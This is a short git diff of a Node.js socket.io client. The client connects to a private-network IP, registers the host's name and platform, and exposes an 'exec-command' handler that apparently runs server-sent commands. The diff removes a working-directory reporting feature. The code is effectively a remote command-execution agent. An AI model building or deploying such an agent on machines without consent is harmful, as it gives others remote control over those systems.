@@ -4,17 +4,6 @@ const os = require("os");
 
 const { exec } = require("child_process");
 
-let currentDir;
-
-
-// pwd
-function setCurrentDirVariable()
-{
-    const cmd = exec("pwd", (error, stdout, stderr) => {
-        socket.emit("set-cwd", stdout);
-    });
-}
-
 
 let url = "http://192.168.178.";
 let ip = 64;
@@ -32,18 +21,12 @@ const socket = io(url + ip + ":" + port, {
 });
 
 socket.on("connect", () => {
-    setCurrentDirVariable();
     socket.emit("register", os.hostname(), os.platform());
 });
 
 socket.on("new-message", (msg) => {
     console.log(msg);
 });
-
-
-socket.on("pwd", () => {
-    setCurrentDirVariable();
-}); 
 
 socket.on("exec-command", (data) => {
     // connection coming through directly
